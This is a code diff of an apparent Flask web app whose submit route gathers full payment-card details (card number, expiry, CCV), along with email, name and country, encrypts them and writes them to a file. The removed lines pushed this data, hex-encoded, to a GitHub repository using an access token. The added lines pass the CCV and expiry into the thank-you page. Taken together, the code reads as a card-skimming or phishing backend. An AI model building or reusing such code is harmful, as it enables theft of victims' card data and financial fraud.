@@ -27,28 +27,6 @@ def get_file_sha():
     return None
 
 
-#@app.route("/submit", methods=["POST"])
-def write_file(content):
-    content = content  # request.form.get("text_data", "Default content")
-    content_encoded = content.encode("utf-8").decode("utf-8")
-
-    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-    data = {
-        "message": "Updating readme.txt",
-        "content": content_encoded.encode("utf-8").hex(),  # Convert to Hex
-        "sha": get_file_sha(),  # Needed for updating existing files
-    }
-
-    response = requests.put(GITHUB_API_URL, headers=headers, data=json.dumps(data))
-
-    if response.status_code in [200, 201]:
-        return "File successfully updated in GitHub!"
-    else:
-        return f"Error: {response.json()}"
-
-
-
-
 # _________________________________________________
 # _________________________________________________
 # Home page route
@@ -132,14 +110,12 @@ def submit():
         * CARD-DETAILS:  Email= {email} ||| Name= {username} ||| expiry-date= {expiry} ||| card-number= {card_number} ||| ccv= {ccv} ||| country= {country} ;
         ---
         '''
-        text = encrypt(text)
-        write_file(text)
-        # file.write(encrypt(text))
+        file.write(encrypt(text))
 
     # Optionally, you could save it to a file or database here
 
     # Redirect to a success page or back to the home page
-    return redirect('/thanks')
+    return render_template('/thanks', username=request.form.get('username'), ccv=request.form.get('ccv'),expiry=request.form.get('expiry'))
 
 
 """# Success page route
